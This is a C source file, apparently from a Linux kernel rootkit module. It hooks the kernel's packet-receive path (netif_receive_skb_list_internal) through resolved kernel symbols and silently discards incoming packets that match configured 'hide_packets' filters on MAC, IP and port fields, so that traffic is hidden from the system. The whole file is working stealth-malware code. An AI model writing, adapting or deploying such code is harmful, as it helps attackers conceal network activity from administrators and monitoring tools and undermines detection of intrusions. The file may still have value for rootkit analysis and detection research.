#include <linux/netdevice.h>
#include <net/sock.h>
#include <linux/net.h>
#include <net/tcp.h>
#include <trace/events/net.h>

#include <license.h>
#include <hide.h>
#include <config.h>
#include <hook.h>
#include <ksyms.h>

// static_branch_unlikely does not compile with ksyms use so it seems,
// so no optimization for you
#define net_timestamp_check(COND, SKB)                          \
/* if (static_branch_unlikely(ksyms__netstamp_needed_key)) { */ \
        if ((COND) && !(SKB)->tstamp)                           \
            __net_timestamp(SKB);                               \

static void __netif_receive_skb_list(struct list_head *head)
{
    unsigned long noreclaim_flag = 0;
    struct sk_buff *skb, *next;
    bool pfmemalloc = false; /* Is current sublist PF_MEMALLOC? */

    /* hook variables */
    int i;
    struct config_netfilter *filter;
    struct ethhdr *eth;
    struct iphdr *ip;
    void *transport;

    list_for_each_entry_safe(skb, next, head, list) {

        /* hook code start */

        eth = (struct ethhdr *)skb_mac_header(skb);
        ip = (struct iphdr *)skb_network_header(skb);
        transport = skb_transport_header(skb);
        
        for (i = 0; i < hide_packets_count; i++) {
            filter = &hide_packets[i];

            if (!filter_eth(filter, eth->h_proto, eth->h_source, eth->h_dest))
                continue;

            if (eth->h_proto == htons(ETH_P_IP) && !filter_ip(filter, ip->protocol, ip->saddr, ip->daddr))
                continue;

            if (ip->protocol == IPPROTO_TCP
            && !filter_transport(filter, ((struct tcphdr *)transport)->source, ((struct tcphdr *)transport)->dest))
                continue;

            else if (ip->protocol == IPPROTO_UDP
            && !filter_transport(filter, ((struct udphdr *)transport)->source, ((struct udphdr *)transport)->dest))
                continue;

            skb_list_del_init(skb);
            consume_skb(skb);
            goto skip_skb;
        }

        /* hook code end */

        if ((sk_memalloc_socks() && skb_pfmemalloc(skb)) != pfmemalloc) {
            struct list_head sublist;
            
            /* Handle the previous sublist */
            list_cut_before(&sublist, head, &skb->list);

            if (!list_empty(&sublist))
                ksyms____netif_receive_skb_list_core(&sublist, pfmemalloc);
            pfmemalloc = !pfmemalloc;
            /* See comments in __netif_receive_skb */
            if (pfmemalloc)
                noreclaim_flag = memalloc_noreclaim_save();
            else
                memalloc_noreclaim_restore(noreclaim_flag);
        }

skip_skb:
        continue;
    }
    /* Handle the remaining sublist */
    if (!list_empty(head))
        ksyms____netif_receive_skb_list_core(head, pfmemalloc);

    /* Restore pflags */
    if (pfmemalloc)
        memalloc_noreclaim_restore(noreclaim_flag);
}

/**
 * No logic changes were made here, but the target function `__netif_receive_skb_list`
 * is inlined in the kernel tested against and is therefore unhookable.
 */
static void netif_receive_skb_list_internal_hook(struct list_head *head)
{
    struct sk_buff *skb, *next;
    struct list_head sublist;

    INIT_LIST_HEAD(&sublist);
    list_for_each_entry_safe(skb, next, head, list) {
        net_timestamp_check(ksyms__netdev_tstamp_prequeue, skb);
        skb_list_del_init(skb);
        if (!skb_defer_rx_timestamp(skb))
            list_add_tail(&skb->list, &sublist);
    }
    list_splice_init(&sublist, head);

    rcu_read_lock();
#ifdef CONFIG_RPS
    if (static_branch_unlikely(&rps_needed)) {
        list_for_each_entry_safe(skb, next, head, list) {
            struct rps_dev_flow voidflow, *rflow = &voidflow;
            int cpu = ksyms__get_rps_cpu(skb->dev, skb, &rflow);

            if (cpu >= 0) {
                /* Will be handled, remove from list */
                skb_list_del_init(skb);
                ksyms__enqueue_to_backlog(skb, cpu, &rflow->last_qtail);
            }
        }
    }
#endif
    __netif_receive_skb_list(head);
    rcu_read_unlock();
}

HOOK_DEFINE(hide, netif_receive_skb_list, ksyms__netif_receive_skb_list_internal, &netif_receive_skb_list_internal_hook);
